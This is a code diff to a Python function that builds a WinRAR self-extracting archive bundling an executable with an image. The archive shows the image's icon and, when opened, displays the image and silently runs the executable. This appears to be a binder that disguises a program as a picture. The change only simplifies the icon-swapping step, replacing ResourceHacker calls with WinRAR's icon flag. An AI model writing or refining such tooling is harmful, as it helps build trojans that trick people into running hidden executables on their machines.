@@ -23,16 +23,11 @@ def create_archive(exe: str, img: str):
     with open(CONFIG, "w") as f:
         f.write(f'Setup={newimg}\nSetup={exe}\nTempMode\nSilent=1\nOverwrite=1\nUpdate=U')
 
-    temp = "temp.exe"
     out = "archive.exe"
     script = "main.bat"
 
     with open(script, "w") as f:
-        f.write("\n".join([
-            f'rar a -sfx -z{CONFIG} {temp} "{exe}" "{newimg}"',
-            f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
-            f'ResourceHacker.exe -open {temp} -save {out} -action add -res {ICON} -mask ICONGROUP,1,'
-        ]))
+        f.write(f'winrar a -sfx -iicontemp.ico -z{CONFIG} {out} "{exe}" "{newimg}"')
 
     subprocess.run([script])
 
@@ -41,7 +36,6 @@ def create_archive(exe: str, img: str):
     os.rename(newimg, img)
     os.remove(ICON)
     os.remove(CONFIG)
-    os.remove(temp)
     os.remove(script)
 
 
